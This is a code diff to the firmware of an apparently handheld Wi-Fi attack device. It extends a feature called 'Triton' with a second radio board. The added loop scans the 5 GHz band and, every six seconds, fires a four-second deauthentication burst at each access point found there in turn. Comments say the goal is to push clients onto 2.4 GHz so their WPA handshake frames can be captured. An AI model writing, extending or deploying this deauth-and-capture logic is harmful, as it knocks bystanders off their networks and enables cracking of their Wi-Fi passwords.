@@ -22,6 +22,7 @@
 #include "ui.h"
 #include "input.h"
 #include "radio.h"
+#include "c5_cmd.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SD.h>
@@ -464,6 +465,17 @@ void feat_triton(void)
 
     xTaskCreate(hop_task, "triton", 3072, nullptr, 4, nullptr);
 
+    /* If a C5 is online, kick off a parallel 5 GHz scan so we have
+     * targets to deauth on the upper band. */
+    c5_begin();
+    bool c5_online = c5_any_online();
+    if (c5_online) {
+        c5_clear_results();
+        c5_cmd_scan_5g(400);
+    }
+    uint32_t last_c5_deauth = 0;
+    int c5_target_idx = 0;
+
     ui_draw_footer("he does it himself. `=back");
 
     uint32_t last_draw = 0;
@@ -529,6 +541,10 @@ void feat_triton(void)
             d.setTextColor(COL_MAGENTA, COL_BG);
             d.setCursor(118, BODY_Y + 68); d.printf("fav:  %d", best_c);
 
+            /* C5 helper badge — green dot if a C5 is helping with 5G. */
+            d.fillCircle(112, BODY_Y + 18, 3, c5_online ? COL_GOOD : COL_DIM);
+            d.fillCircle(112, BODY_Y + 28, 3, c5_online ? COL_MAGENTA : COL_DIM);
+
             /* Mood speech bubble below the face. */
             d.setTextColor(COL_WARN, COL_BG);
             int ty = BODY_Y + 76;
@@ -536,6 +552,26 @@ void feat_triton(void)
             d.setCursor(4, ty); d.printf("> %s", w);
 
             ui_draw_status("wifi", "triton");
+        }
+
+        /* Every 6s, rotate to the next 5 GHz target and have the C5
+         * blast a 4-second deauth burst. Knocks dual-band clients off
+         * 5G, they cascade back to 2.4 where Triton catches the M1/M2. */
+        if (c5_online && now - last_c5_deauth > 6000) {
+            last_c5_deauth = now;
+            c5_ap_t aps[64];
+            int n = c5_aps(aps, 64);
+            int five_n = 0;
+            for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
+            if (five_n > 0) {
+                const c5_ap_t &t = aps[c5_target_idx % five_n];
+                c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
+                c5_target_idx++;
+            } else {
+                /* Re-scan if our 5G list emptied out. */
+                c5_clear_results();
+                c5_cmd_scan_5g(400);
+            }
         }
 
         uint16_t k = input_poll();
